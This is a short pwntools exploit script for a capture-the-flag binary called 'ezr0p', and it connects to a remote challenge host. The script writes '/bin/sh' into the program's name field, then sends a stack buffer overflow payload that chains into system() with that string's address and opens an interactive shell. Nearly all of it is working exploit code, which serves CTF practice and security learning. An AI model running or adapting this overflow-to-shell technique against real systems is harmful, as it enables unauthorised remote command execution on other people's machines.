from pwn import *
from LibcSearcher import *

# p = remote("192.168.170.128", 1234)
# context.arch = "amd64"

# p = remote("node4.buuoj.cn", 28576)
p = remote("node5.anna.nssctf.cn", 28633)
# context(os='linux', arch = 'amd64', log_level = "debug")
elf = ELF('ezr0p')


def s(a):
    p.send(a)


def sa(a, b):
    p.sendafter(a, b)


def sl(a):
    p.sendline(a)


def sal(a, b):
    p.sendlineafter(a, b)


def r(a):
    return p.recv(a)


def ru(a):
    p.recvuntil(a)


def rl():
    p.recvline()

def sla(a, b):
    p.sendlineafter(a, b)

def debug():
    gdb.attach(p)
    pause()


def get_addr():
    return u64(p.recvuntil(b'\x7f')[-6:].ljust(8, b'\x00'))


def inter():
    return p.interactive()


context(os='linux', arch='i386')
# context(os='linux', arch = 'amd64', log_level = "debug")

ru("please tell me your name")
s(b'/bin/sh\x00')

payload = b'a' * (0x1c + 4) + p32(elf.sym['system']) + p32(0) + p32(0x0804A080)
ru("now it's your play time~")
sl(payload)

inter()
